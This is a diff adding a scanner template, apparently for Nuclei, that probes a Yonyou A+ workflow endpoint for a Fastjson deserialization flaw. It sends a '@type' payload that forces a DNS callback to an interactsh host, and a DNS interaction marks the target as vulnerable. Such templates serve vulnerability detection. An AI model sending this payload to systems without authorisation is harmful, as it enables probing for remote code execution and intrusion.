@@ -1,0 +1,30 @@
+id: yonyou-a-plus-rectifyAuditGaDoubt-rce
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /ga/api/workflow/rectifyAuditGaDoubt HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/json
+        Cookie: JSESSIONID=A38731F543E167FAF1E74D7BF4EB7A0A
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+        {"Lh":{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
